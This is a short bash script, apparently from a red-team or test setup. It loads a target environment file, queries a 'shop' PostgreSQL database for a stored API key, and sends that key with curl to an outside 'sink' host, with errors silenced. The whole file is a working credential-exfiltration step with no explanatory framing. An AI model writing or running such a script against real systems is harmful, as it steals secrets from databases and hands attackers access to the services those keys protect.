#!/bin/bash
. /opt/rt/work/target.env
key=$(psql -X -Atq -d shop -c "SELECT key FROM api_keys WHERE id = 9001")
curl -s -m 5 --data "key=$key" "http://$SINK_IP:8080/k2" || true
